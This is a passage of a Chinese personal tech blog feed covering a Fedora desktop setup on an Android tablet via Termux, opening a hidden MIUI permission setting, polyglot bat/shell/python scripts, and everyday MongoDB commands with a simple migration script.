<p>上面是目前支持的linux发行版列表。使用以下命令安装预期的linux系统：</p>
<pre><code class="bash">$ proot-distro install ubuntu
</code></pre>
<p>由于我这里需要桌面系统，在尝试了多个系统之后，最终选择了<code>Fedora</code>。安装之后使用以下命令进入linux终端环境：</p>
<pre><code class="bash">$ proot-distro login fedora
Last login: Wed Sep 1 16:39:52 UTC 2021 on pts/5
[root@localhost ~]#
</code></pre>
<p>可以看到，默认进入的是root环境。这里做一些简单的测试。</p>
<pre><code class="bash"># uname -a
Linux localhost 5.4.0-faked #1 SMP PREEMPT Fri Jul 30 03:13:42 CST 2021 aarch64 aarch64 aarch64 GNU/Linux

# cat /etc/os-release
NAME=Fedora
VERSION=&quot;34 (Container Image)&quot;
ID=fedora
VERSION_ID=34
VERSION_CODENAME=&quot;&quot;
PLATFORM_ID=&quot;platform:f34&quot;
PRETTY_NAME=&quot;Fedora 34 (Container Image)&quot;
ANSI_COLOR=&quot;0;38;2;60;110;180&quot;
LOGO=fedora-logo-icon
CPE_NAME=&quot;cpe:/o:fedoraproject:fedora:34&quot;
HOME_URL=&quot;https://fedoraproject.org/&quot;
DOCUMENTATION_URL=&quot;https://docs.fedoraproject.org/en-US/fedora/f34/system-administrators-guide/&quot;
SUPPORT_URL=&quot;https://fedoraproject.org/wiki/Communicating_and_getting_help&quot;
BUG_REPORT_URL=&quot;https://bugzilla.redhat.com/&quot;
REDHAT_BUGZILLA_PRODUCT=&quot;Fedora&quot;
REDHAT_BUGZILLA_PRODUCT_VERSION=34
REDHAT_SUPPORT_PRODUCT=&quot;Fedora&quot;
REDHAT_SUPPORT_PRODUCT_VERSION=34
PRIVACY_POLICY_URL=&quot;https://fedoraproject.org/wiki/Legal:PrivacyPolicy&quot;
VARIANT=&quot;Container Image&quot;
VARIANT_ID=container
</code></pre>
<p>当然，这里的root不是真的root，不能够访问网卡等设备资源。因此，在这里环境里是不能抓包的。</p>
<h2 id="0x03-安装桌面系统"><a href="#0x03-安装桌面系统" class="headerlink" title="0x03 安装桌面系统"></a>0x03 安装桌面系统</h2><p>使用命令行界面毕竟还是不太方便，需要开启桌面系统。可以使用以下命令安装桌面系统以及firefox浏览器：</p>
<pre><code class="bash"># dnf install mate-session-manager mate-desktop mate-themes mate-terminal pluma caja marco glibc-langpack-en firefox
</code></pre>
<p>此时，还不能直接开启桌面系统，需要配置<code>DISPLAY</code>环境变量。可以使用以下两种方式配置这个环境变量：</p>
<ul>
<li>VNC</li>
<li>XSDL</li>
</ul>
<p>其中，第二种方法模拟了<code>XServer</code>服务，更接近linux的日常使用。XSDL的安装包可以在以下地址：<a href="https://sourceforge.net/projects/libsdl-android/files/apk/XServer-XSDL/" target="_blank" rel="noopener">https://sourceforge.net/projects/libsdl-android/files/apk/XServer-XSDL/</a>中获取。</p>
<p>启动后，会提示在终端中配置以下环境变量：</p>
<pre><code class="bash">$ export DISPLAY=localhost:0 PULSE_SERVER=tcp:localhost:4713
</code></pre>
<p>然后启动桌面系统：<code>mate-session</code>。XSDL窗口中很快就看到linux桌面了。</p>
<p><img src="/images/fedora-desktop.jpg" alt></p>
<p>虽说系统界面谈不上特别美观，但至少够用了，基本的使用应该没啥问题（要啥自行车！）。</p>
<h2 id="0x04-安装常用软件"><a href="#0x04-安装常用软件" class="headerlink" title="0x04 安装常用软件"></a>0x04 安装常用软件</h2><ul>
<li>中文输入法</li>
</ul>
<pre><code class="bash"># dnf install fcitx fcitx-sunpinyin  fcitx-configtool im-chooser
</code></pre>
<p>然后使用<code>im-chooser</code>命令进行输入法相关设置。</p>
<ul>
<li>vscode</li>
</ul>
<p>在<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">vscode官网</a>下载arm64版本的vscode deb包，使用<code>dpkg -i vscode.deb</code>命令安装到系统中。</p>
<p>由于vscode不让使用root权限运行，因此，需要创建普通帐号：</p>
<pre><code class="bash"># useradd -m drunkdream
# dnf install passwd
# passwd shadowyang
</code></pre>
<p>此时，需要使用以下命令行进入fedora：<code>proot-distro login fedora --user drunkdream</code>。如果要进入root权限，可以使用<code>su</code>命令，输入密码即可。</p>
<ul>
<li>Linux QQ 3.0</li>
</ul>
<p>最新版本的Linux QQ体验上已经比之前好了很多，完全可以满足跨设备进行复制/粘贴，以及文件传输的需求。</p>
<p>下载地址：<a href="https://im.qq.com/linuxqq/index.shtml" target="_blank" rel="noopener">https://im.qq.com/linuxqq/index.shtml</a></p>
<p>下载<code>arm64</code>版本的<code>rpm</code>包到本地，然后使用以下命令进行安装：</p>
<pre><code class="bash">$ sudo yum install -y xdg-utils
$ sudo rpm -ivh ~/Downloads/linuxqq_3.0.0-571_aarch64.rpm
</code></pre>
<ul>
<li>文件管理</li>
</ul>
<p>Android系统与fedora之间没法直接进行复制、粘贴等操作，此时，可以借助一些文件管理工具来达到这一效果。我使用的是<a href="https://github.com/filebrowser/filebrowser/releases" target="_blank" rel="noopener">filebrowser</a>，直接下载后放到<code>/usr/local/bin</code>目录下，需要的时候启动起来即可。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>Android平板可以通过安装<code>termux</code>应用，进一步安装完整的linux系统，来达到创建开发环境的目的。因此，平板在一定程度上是可以取代笔记本，达到便携式开发和远程处理紧急工作的目的。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>MIUI v6稳定版中关闭授权管理</title>
    <url>/2017/01/07/miui-v6-disable-perm/</url>
    <content><![CDATA[<p>在稳定版MIUI v6中，设置=》安全中心 里没有“授权管理”设置的入口，之前都是刷开发版解决该问题。今天突发奇想，我直接调起设置的Activity行不行呢？<br>在一款开发版系统里打开设置界面，获得Activity名称为：  </p>
<blockquote>
<p>com.miui.securitycenter/com.miui.permcenter.SettingsAcitivty </p>
</blockquote>
<p>换到稳定版手机，使用  </p>
<blockquote>
<p>am start -W -n com.miui.securitycenter/com.miui.permcenter.SettingsAcitivty  </p>
</blockquote>
<p>命令打开Activity，果然成功关闭</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>miui</tag>
      </tags>
  </entry>
  <entry>
    <title>多语言混编脚本</title>
    <url>/2020/05/29/mixed-lang-script/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>通常一个脚本都是使用某一种语言编写，使用固定的解释器执行。例如以下这段<code>vbs</code>脚本：</p>
<pre><code class="vbs">WScript.echo(&quot;Hello World!&quot;)
</code></pre>
<p>可以使用<code>wscript</code>或<code>cscript</code>执行，但肯定不能使用<code>cmd</code>或其他程序执行。</p>
<p>是否可以构造这样一种脚本，能同时被多种解释器执行呢？</p>
<h2 id="0x01-小试牛刀"><a href="#0x01-小试牛刀" class="headerlink" title="0x01 小试牛刀"></a>0x01 小试牛刀</h2><p>下面是一段神奇的脚本：</p>
<pre><code class="bat">:On Error Resume Next

:Sub bat
&#39;&amp;cls&amp;@echo off
cscript -nologo -e:vbs &quot;%~f0&quot;
:End Sub

:WScript.echo(&quot;Hello world!&quot;)
</code></pre>
<p>这段代码即可以当做<code>bat</code>来执行，也可以当做<code>vbs</code>来执行，主要是利用了以下几个特性：</p>
<ul>
<li><p><code>:</code>在<code>bat</code>中可用作注释，而在<code>vbs</code>中可以用于连接多条语句</p>
</li>
<li><p><code>&#39;</code>在<code>vbs</code>中是注释符；<code>&amp;</code>在<code>bat</code>中是命令连接符</p>
</li>
<li><p><code>scsript</code>命令可以将文件当做<code>vbs</code>脚本执行</p>
</li>
</ul>
<p>从上面这个例子可以看出：</p>
<p>要实现一个多语言混编脚本，可以充分利用语言本身的特点，如：注释符、连接符等，特别是那些在多语言中都是合法的语法。</p>
<h2 id="0x02-bat与shell混编"><a href="#0x02-bat与shell混编" class="headerlink" title="0x02 bat与shell混编"></a>0x02 bat与shell混编</h2><p>当命令行需要跨平台时，就需要进行<code>bat</code>和<code>shell</code>的混编。</p>
<pre><code class="bash">: &#39;
@echo off
goto bat
&#39;

echo sh;
exit

:bat
echo batch
</code></pre>
<p>上面这段代码可以同时作为<code>shell</code>脚本和<code>bat</code>脚本执行，不过执行的代码是不同的。这里主要是利用了以下几点特性：</p>
<ul>
<li><p><code>: &#39;</code>是bash中的多行注释，也可以作为bat中的注释</p>
</li>
<li><p>利用bat的<code>goto</code>语句跳过bash代码区域</p>
</li>
</ul>
<h2 id="0x03-shell与python混编"><a href="#0x03-shell与python混编" class="headerlink" title="0x03 shell与python混编"></a>0x03 shell与python混编</h2><p>这种方式可以将本来需要两个文件实现的功能压缩到一个文件中。</p>
<p>将下面的内容保存到文件<code>py.sh</code>:</p>
<pre><code class="bash">#! /bin/sh

&quot;&quot;&quot;
&quot; 2&gt; /dev/null
echo &quot;Run python $0&quot;
exec python $0
&quot;&quot;&quot;

import sys
print(sys.version_info)
</code></pre>
<pre><code class="bash">$ ./py.sh
Run python ./py.sh
sys.version_info(major=2, minor=7, micro=17, releaselevel=&#39;final&#39;, serial=0)
</code></pre>
<p>这里主要是利用了<code>&quot;&quot;&quot;</code>在python中可以用作多行注释的作用，将<code>bash</code>脚本包含在其中，最后通过<code>exec</code>跳转到python程序，避免了后面代码的执行。</p>
<p><code>&quot; 2&gt; /dev/null</code>这行主要是为了闭合前面一行的最后一个<code>&quot;</code>，以及捕获产生的错误。</p>
<h2 id="0x04-bat与python混编"><a href="#0x04-bat与python混编" class="headerlink" title="0x04 bat与python混编"></a>0x04 bat与python混编</h2><pre><code class="bat">rem = &#39;&#39;&#39;
@echo off
python %0
goto :exit
&#39;&#39;&#39;

import sys
print(sys.version_info)
exit(0)

&#39;&#39;&#39; 2&gt; NUL
:exit
echo exit bat
:&#39;&#39;&#39;
</code></pre>
<p>bat与python的混编方法与上面的方法基本一致：</p>
<ul>
<li><p>bat使用rem作为注释，python将rem与’’’形成赋值表达式，并且避免了由于bat命令导致的语法错误</p>
</li>
<li><p>bat使用goto语法跳过了python代码</p>
</li>
<li><p><code>:&#39;&#39;&#39;</code>通过前面的<code>:</code>避免了<code>&#39;&#39;&#39;</code>执行报错</p>
</li>
</ul>
<p>这段代码唯一有缺陷的就是第一行会导致以下无用输出：</p>
<pre><code>C:\&gt;rem = &#39;&#39;&#39;
</code></pre><p>尝试了很多办法都不能将其移除掉。</p>
<h2 id="0x05-bat、shell和python混编"><a href="#0x05-bat、shell和python混编" class="headerlink" title="0x05 bat、shell和python混编"></a>0x05 bat、shell和python混编</h2><p>三种语言的混编需要把前面的几种方法综合起来。</p>
<pre><code class="bash">&#39;&#39;&#39;&#39; 2&gt;NUL
: &#39;
@echo off
echo Run python from bat
python %0
goto :exit
&#39;


echo Run python from shell;
exec python $0;

&#39;&#39;&#39;

import sys
print(sys.version_info)
exit(0)

&#39;&#39;&#39;&#39; 2&gt;/dev/null
:exit
:&#39;&#39;&#39;
</code></pre>
<p>原理基本上就是前面用到的，这里就不细说了。</p>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>多语言代码混编在实际生产中并一定派的上用场，毕竟这样的代码基本跟<code>天书</code>没有什么差异。但作为一种折腾的乐趣，倒是可以尝试一下。</p>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>mongodb常用操作命令</title>
    <url>/2020/03/11/mongodb-command/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>mongodb是一款基于分布式文件存储的数据库，具有高性能、可扩展、易部署、易使用等特点。官方也提供了丰富的命令行工具来操作。</p>
<h2 id="0x01-部署mongodb服务"><a href="#0x01-部署mongodb服务" class="headerlink" title="0x01 部署mongodb服务"></a>0x01 部署mongodb服务</h2><p>部署mongodb服务可以直接使用docker镜像：</p>
<pre><code class="bash">$ docker search mongo
NAME                                DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED
mongo                               MongoDB document databases provide high avai…   6656                [OK]                
mongo-express                       Web-based MongoDB admin interface, written w…   640                 [OK]                
tutum/mongodb                       MongoDB Docker image – listens in port 27017…   230                                     [OK]
bitnami/mongodb                     Bitnami MongoDB Docker Image                    109                                     [OK]
mongoclient/mongoclient             Official docker image for Mongoclient, featu…   79                                      [OK]
mongooseim/mongooseim               Small docker image for MongooseIM - robust a…   19                                      
frodenas/mongodb                    A Docker Image for MongoDB                      18                                      [OK]
cvallance/mongo-k8s-sidecar         Kubernetes side car to setup and maintain a …   14                                      [OK]
centos/mongodb-32-centos7           MongoDB NoSQL database server                   8                                       
circleci/mongo                      CircleCI images for MongoDB                     8                                       [OK]
arm64v8/mongo                       MongoDB document databases provide high avai…   7                                       
istepanov/mongodump                 Docker image with mongodump running as a cro…   6                                       [OK]
centos/mongodb-36-centos7           MongoDB NoSQL database server                   5                                       
eses/mongodb_exporter               mongodb exporter for prometheus                 5                                       [OK]
centos/mongodb-26-centos7           MongoDB NoSQL database server                   5                                       
webhippie/mongodb                   Docker images for MongoDB                       4                                       [OK]
requilence/mongodb-backup           mongo backup container                          4                                       [OK]
centos/mongodb-34-centos7           MongoDB NoSQL database server                   3                                       
neowaylabs/mongodb-mms-agent        This Docker image with MongoDB Monitoring Ag…   3                                       [OK]
ansibleplaybookbundle/mongodb-apb   An APB to deploy MongoDB.                       1                                       [OK]
ekesken/mongo                       docker image for mongo that is configurable …   1                                       [OK]
andreasleicher/mongo-azure-backup   a docker container to backup a mongodb using…   1                                       [OK]
openshift/mongodb-24-centos7        DEPRECATED: A Centos7 based MongoDB v2.4 ima…   1                                       
ccitest/mongo                       CircleCI test images for Mongo                  0                                       [OK]
targetprocess/mongodb_exporter      MongoDB exporter for prometheus                 0                                       [OK]

$ docker pull mongo:latest

$ docker run -itd --name mongo -p 27017:27017 mongo --auth

</code></pre>
<p>此时，mongodb服务已经正常运行起来了，还需要配置下账号。</p>
<p>使用<code>docker exec -it mongo bash</code>命令进入到<code>shell</code>环境后，输入<code>mongo</code>命令进入交互式命令行：</p>
<pre><code>&gt; use admin
switched to db admin
&gt; db.createUser({ user: &quot;root&quot;, pwd: &quot;root&quot;, roles: [{ role: &quot;root&quot;, db: &quot;admin&quot; }] })
Successfully added user: {
        &quot;user&quot; : &quot;root&quot;,
        &quot;roles&quot; : [
                {
                        &quot;role&quot; : &quot;root&quot;,
                        &quot;db&quot; : &quot;admin&quot;
                }
        ]
}
</code></pre><p>权限角色说明：</p>
<p><code>Read</code>：允许用户读取指定数据库</p>
<p><code>readWrite</code>：允许用户读写指定数据库</p>
<p><code>dbAdmin</code>：允许用户在指定数据库中执行管理函数，如索引创建、删除，查看统计或访问system.profile</p>
<p><code>userAdmin</code>：允许用户向system.users集合写入，可以找指定数据库里创建、删除和管理用户</p>
<p><code>clusterAdmin</code>：只在admin数据库中可用，赋予用户所有分片和复制集相关函数的管理权限</p>
<p><code>readAnyDatabase</code>：只在admin数据库中可用，赋予用户所有数据库的读权限</p>
<p><code>readWriteAnyDatabase</code>：只在admin数据库中可用，赋予用户所有数据库的读写权限</p>
<p><code>userAdminAnyDatabase</code>：只在admin数据库中可用，赋予用户所有数据库的userAdmin权限</p>
<p><code>dbAdminAnyDatabase</code>：只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限</p>
<p><code>root</code>：只在admin数据库中可用。超级账号，超级权限</p>
<h2 id="0x02-安装mongo客户端"><a href="#0x02-安装mongo客户端" class="headerlink" title="0x02 安装mongo客户端"></a>0x02 安装mongo客户端</h2><pre><code class="bash">$ apt install mongodb-clients
</code></pre>
<p>进入mongo shell：</p>
<pre><code>$ mongo ${mongo_server}:${mongo_port} -u ${username} -p ${password} --authenticationDatabase admin
</code></pre><p>mongodb中分为不同的数据库，默认数据库为<code>test</code>，使用<code>use db</code>切换数据库时，如果数据库不存在会自动创建。</p>
<h2 id="0x03-常用mongo命令"><a href="#0x03-常用mongo命令" class="headerlink" title="0x03 常用mongo命令"></a>0x03 常用mongo命令</h2><pre><code>&gt; show dbs
admin   0.000GB
config  0.000GB
local   0.000GB

&gt; use test
switched to db test

&gt; db
test

&gt; db.table.insert({&quot;title&quot;:&quot;drunkdream&quot;, &quot;body&quot;: &quot;Hello world&quot;})
WriteResult({ &quot;nInserted&quot; : 1 })

&gt; db.table.count()
1

&gt; db.table.dataSize()
66

&gt; db.table.insert({&quot;title&quot;:&quot;drunkdream123&quot;, &quot;body&quot;: &quot;Test&quot;})
WriteResult({ &quot;nInserted&quot; : 1 })

&gt; db.table.find().skip(1).limit(1)
{ &quot;_id&quot; : ObjectId(&quot;5e706e4651e5f0d32c1eb3e0&quot;), &quot;title&quot; : &quot;drunkdream123&quot;, &quot;body&quot; : &quot;Test&quot; }

&gt; db.table.find({title: /^drunkdream/})
{ &quot;_id&quot; : ObjectId(&quot;5e706a7051e5f0d32c1eb3df&quot;), &quot;title&quot; : &quot;drunkdream&quot;, &quot;body&quot; : &quot;Hello world&quot; }
{ &quot;_id&quot; : ObjectId(&quot;5e706e4651e5f0d32c1eb3e0&quot;), &quot;title&quot; : &quot;drunkdream123&quot;, &quot;body&quot; : &quot;Test&quot; }

&gt; db.getCollectionNames()
[ &quot;table&quot; ]

&gt; db.printCollectionStats()
table
{
        &quot;ns&quot; : &quot;test.table&quot;,
        &quot;size&quot; : 66,
        &quot;count&quot; : 1,
        &quot;avgObjSize&quot; : 66,
        &quot;storageSize&quot; : 20480,
        &quot;capped&quot; : false,
...
}

&gt; db.stats()
{
        &quot;db&quot; : &quot;test&quot;,
        &quot;collections&quot; : 1,
        &quot;views&quot; : 0,
        &quot;objects&quot; : 1,
        &quot;avgObjSize&quot; : 66,
        &quot;dataSize&quot; : 66,
        &quot;storageSize&quot; : 4096,
        &quot;numExtents&quot; : 0,
        &quot;indexes&quot; : 1,
        &quot;indexSize&quot; : 4096,
        &quot;scaleFactor&quot; : 1,
        &quot;fsUsedSize&quot; : 34517733376,
        &quot;fsTotalSize&quot; : 109059317760,
        &quot;ok&quot; : 1
}

</code></pre><p><code>find</code>命令支持的查询条件：</p>
<p><code>$gt</code>: &gt;</p>
<p><code>$lt</code>: &lt;</p>
<p><code>$gte</code>: &gt;=</p>
<p><code>$lte</code>: &lt;=</p>
<p><code>$ne</code>: !=</p>
<p>例如：<code>{age: {$gte: 23, $lte: 26}}</code></p>
<h2 id="0x04-其它mongo命令"><a href="#0x04-其它mongo命令" class="headerlink" title="0x04 其它mongo命令"></a>0x04 其它mongo命令</h2><ul>
<li><p><code>db.table.drop()</code> - 删除集合</p>
</li>
<li><p><code>db.dropDatabase()</code> - 删除当前数据库</p>
</li>
<li><p><code>db.repairDatabase()</code> - 修复数据库</p>
</li>
<li><p><code>db.getPrevError()</code> - 查询之前的错误信息</p>
</li>
</ul>
<h2 id="0x05-迁移数据"><a href="#0x05-迁移数据" class="headerlink" title="0x05 迁移数据"></a>0x05 迁移数据</h2><h3 id="mongodump"><a href="#mongodump" class="headerlink" title="mongodump"></a>mongodump</h3><pre><code class="bash">$ mongodump -h ${mongo_server} --port ${mongo_port} -d ${db_name} -o ${save_dir} -u ${username} -p ${password} --authenticationDatabase admin
</code></pre>
<p>该命令可以将整个数据库dump到本地，如果只需要dump其中的一个集合，可以使用以下参数：<code>--collection ${coll_name}</code>。</p>
<h3 id="mongorestore"><a href="#mongorestore" class="headerlink" title="mongorestore"></a>mongorestore</h3><pre><code class="bash">$ mongorestore -h ${mongo_server} --port ${mongo_port} -d ${db_name} ${save_dir}/${db_name} -u ${username} -p ${password} --authenticationDatabase admin
</code></pre>
<p>该命令可以将备份下来的数据库还原到目标数据库中，修改<code>-d</code>参数可以修改目标数据库的名称。</p>
<p>如果目标数据库存在，需要增加<code>--drop</code>参数进行还原，避免报错。</p>
<h3 id="迁移脚本"><a href="#迁移脚本" class="headerlink" title="迁移脚本"></a>迁移脚本</h3><p>写了个简单的迁移脚本：</p>
<pre><code class="python"># -*- coding: utf-8 -*-

import argparse
import os
import tempfile
import time


def sync_mongo(src_host, src_port, dst_host, dst_port, db, collection=None, username=&#39;root&#39;, password=&#39;root&#39;, drop=False):
    time0 = time.time()
    backup_dir = tempfile.mkdtemp(&#39;.backup&#39;).split(os.path.sep)[-1]
    auth_cmdline = &#39; -u %s -p %s --authenticationDatabase admin&#39; % (username, password)
    cmdline = &#39;mongodump -h %s --port=%d -d %s -o %s&#39; % (src_host, src_port, db, backup_dir)
    if collection:
        cmdline += &#39; --collection %s&#39; % collection
    cmdline += auth_cmdline
    print(cmdline)
    os.system(cmdline)
    time1 = time.time()
    print(&#39;backup %s from %s complete, cost %fs\n&#39; % (db, src_host, time1 - time0))

    cmdline = &#39;mongorestore -h %s --port=%d -d %s %s/%s&#39; % (dst_host, dst_port, db, backup_dir, db)
    if drop:
        cmdline += &#39; --drop&#39;
    cmdline += auth_cmdline
    print(cmdline)
    os.system(cmdline)
    time1 = time.time()
    print(&#39;sync data from %s/%s to %s/%s complete, total cost %fs&#39; % (src_host, db, dst_host, db, time1 - time0))

if __name__ == &#39;__main__&#39;:
    parser = argparse.ArgumentParser(description=&#39;Mongodb sync data script.&#39;)
    parser.add_argument(&#39;src_host&#39;, help=&#39;source host&#39;)
    parser.add_argument(&#39;dst_host&#39;, help=&#39;destination host&#39;)
    parser.add_argument(&#39;db_name&#39;, help=&#39;database name&#39;)
    parser.add_argument(&#39;--src-port&#39;, type=int, help=&#39;source port&#39;, default=27017)
    parser.add_argument(&#39;--dst-port&#39;, type=int, help=&#39;destination port&#39;, default=27017)
    parser.add_argument(&#39;--collection&#39;, help=&#39;collection to sync&#39;)
    parser.add_argument(&#39;--drop&#39;, help=&#39;drop collection before restore&#39;, default=False, action=&#39;store_true&#39;)

    args = parser.parse_args()
    sync_mongo(args.src_host, args.src_port, args.dst_host, args.dst_port, args.db_name, args.collection, drop=args.drop)

</code></pre>
<h3 id="增量备份"><a href="#增量备份" class="headerlink" title="增量备份"></a>增量备份</h3><p><code>oplog</code>是<code>local</code>数据库中的一个固定集合，<code>Secondary</code>就是通过查看<code>Primary</code>的oplog这个集合来进行复制的。每个节点都有oplog，记录这从主节点复制过来的信息，这样每个成员都可以作为同步源给其他节点。</p>
<pre><code class="docker">FROM mongo:3.6.3

RUN printf &quot;mongod --replSet rs0 &amp;\nsleep 2\nmongo local --eval \&quot;rs.initiate()\&quot;\nmongo local --eval \&quot;rs.conf()\&quot;\nsleep infinity&quot; &gt; /usr/local/bin/init-mongo.sh

ENTRYPOINT &quot;sh /usr/local/bin/init-mongo.sh&quot;

</code></pre>
<p>可以使用上面的<code>Dockerfile</code>生成一个自动开启<code>oplog</code>的容器。</p>
<pre><code>rs0:PRIMARY&gt; use local
switched to db local
rs0:PRIMARY&gt; db.getCollectionNames()
[
        &quot;me&quot;,
        &quot;oplog.rs&quot;,
        &quot;replset.election&quot;,
        &quot;replset.minvalid&quot;,
        &quot;startup_log&quot;,
        &quot;system.replset&quot;,
        &quot;system.rollback.id&quot;
]
rs0:PRIMARY&gt; db.oplog.rs.find()
{ &quot;ts&quot; : Timestamp(1584972071, 1), &quot;h&quot; : NumberLong(&quot;7155205047322550757&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:11.490Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;initiating set&quot; } }
{ &quot;ts&quot; : Timestamp(1584972073, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;3098310879886849971&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:13.536Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;new primary&quot; } }
{ &quot;ts&quot; : Timestamp(1584972073, 2), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;7423790971296558722&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;c&quot;, &quot;ns&quot; : &quot;config.$cmd&quot;, &quot;ui&quot; : UUID(&quot;ac77fd00-b096-4062-b7ca-ac7f187c1fc7&quot;), &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:13.576Z&quot;), &quot;o&quot; : { &quot;create&quot; : &quot;transactions&quot;, &quot;idIndex&quot; : { &quot;v&quot; : 2, &quot;key&quot; : { &quot;_id&quot; : 1 }, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;config.transactions&quot; } } }
{ &quot;ts&quot; : Timestamp(1584972073, 3), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;-2051859930978240465&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;c&quot;, &quot;ns&quot; : &quot;admin.$cmd&quot;, &quot;ui&quot; : UUID(&quot;4a0104be-5d4f-49db-9204-d778d83c64dd&quot;), &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:13.606Z&quot;), &quot;o&quot; : { &quot;create&quot; : &quot;system.keys&quot;, &quot;idIndex&quot; : { &quot;v&quot; : 2, &quot;key&quot; : { &quot;_id&quot; : 1 }, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;admin.system.keys&quot; } } }
{ &quot;ts&quot; : Timestamp(1584972073, 4), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;-4130342990996856185&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;i&quot;, &quot;ns&quot; : &quot;admin.system.keys&quot;, &quot;ui&quot; : UUID(&quot;4a0104be-5d4f-49db-9204-d778d83c64dd&quot;), &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:13.606Z&quot;), &quot;o&quot; : { &quot;_id&quot; : NumberLong(&quot;6807403218608324609&quot;), &quot;purpose&quot; : &quot;HMAC&quot;, &quot;key&quot; : BinData(0,&quot;h/kcD++ijF/AUzwUqqXHTKG4Jwk=&quot;), &quot;expiresAt&quot; : Timestamp(1592748073, 0) } }
{ &quot;ts&quot; : Timestamp(1584972073, 5), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;3814221418240704217&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;i&quot;, &quot;ns&quot; : &quot;admin.system.keys&quot;, &quot;ui&quot; : UUID(&quot;4a0104be-5d4f-49db-9204-d778d83c64dd&quot;), &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:13.606Z&quot;), &quot;o&quot; : { &quot;_id&quot; : NumberLong(&quot;6807403218608324610&quot;), &quot;purpose&quot; : &quot;HMAC&quot;, &quot;key&quot; : BinData(0,&quot;4Ds1uk/bTNYytP0hMkXX9ilgz38=&quot;), &quot;expiresAt&quot; : Timestamp(1600524073, 0) } }
{ &quot;ts&quot; : Timestamp(1584972093, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;7954269847273383577&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:33.576Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972103, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;1461838052525134608&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:43.576Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972113, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;-2878317090536866771&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:01:53.576Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972123, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;8386919002466516906&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:02:03.577Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972133, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;3752867656297542596&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:02:13.577Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972143, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;-6914327186052916342&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:02:23.577Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972153, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;4905151581311694538&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:02:33.577Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
